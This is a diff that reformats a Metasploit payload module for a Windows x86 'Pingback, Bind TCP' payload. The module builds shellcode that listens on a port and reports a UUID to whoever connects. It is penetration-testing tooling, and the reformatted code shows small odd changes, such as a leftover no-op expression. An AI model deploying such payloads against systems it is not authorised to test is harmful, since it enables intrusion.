@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 314
 
   include Msf::Payload::Windows
@@ -16,38 +14,42 @@ module MetasploitModule
   include Msf::Payload::Windows::Exitfunk
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Windows x86 Pingback, Bind TCP Inline',
-      'Description'   => 'Open a socket and report UUID when a connection is received (Windows x86)',
-      'Author'        => [ 'bwatters-r7' ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'win',
-      'Arch'          => ARCH_X86,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::Pingback
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows x86 Pingback, Bind TCP Inline',
+        'Description' => 'Open a socket and report UUID when a connection is received (Windows x86)',
+        'Author' => [ 'bwatters-r7' ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X86,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::Pingback
+      )
+    )
+  end
 
-    def required_space
-      # Start with our cached default generated size
-      space = cached_size
+  def required_space
+    # Start with our cached default generated size
+    space = cached_size
 
-      # EXITFUNK 'seh' is the worst case, that adds 15 bytes
-      space += 15
+    # EXITFUNK 'seh' is the worst case, that adds 15 bytes
+    space += 15
 
-      space
-    end
+    space
+  end
 
-    def generate(_opts = {})
-      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
-      encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
-      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
-      self.pingback_uuid ||= self.generate_pingback_uuid
-      uuid_as_db = "0x" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
-      conf = { exitfunk: datastore['EXITFUNC'] }
-      addr_fam      = 2
-      sockaddr_size = 16
+  def generate(_opts = {})
+    encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack('N').first
+    encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack('V').first
+    [encoded_host, encoded_port]
+    self.pingback_uuid ||= generate_pingback_uuid
+    uuid_as_db = '0x' + self.pingback_uuid.chars.each_slice(2).map(&:join).join(',0x')
+    conf = { exitfunk: datastore['EXITFUNC'] }
+    addr_fam = 2
+    sockaddr_size = 16
 
-      asm = %Q^
+    asm = %^
         cld                    ; Clear the direction flag.
         call start             ; Call start, this pushes the address of 'api_call' onto the stack.
         #{asm_block_api}
@@ -117,7 +119,7 @@ module MetasploitModule
 
         send_pingback:
           push 0                 ; flags
-          push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
+          push #{uuid_as_db.split(',').length} ; length of the PINGBACK UUID
           call get_pingback_address  ; put pingback_uuid buffer on the stack
           db #{uuid_as_db}  ; PINGBACK_UUID
         get_pingback_address:
@@ -143,10 +145,9 @@ module MetasploitModule
 
         failure:
       ^
-      if conf[:exitfunk]
-        asm << asm_exitfunk(conf)
-      end
-      Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
+    if conf[:exitfunk]
+      asm << asm_exitfunk(conf)
     end
+    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
   end
 end
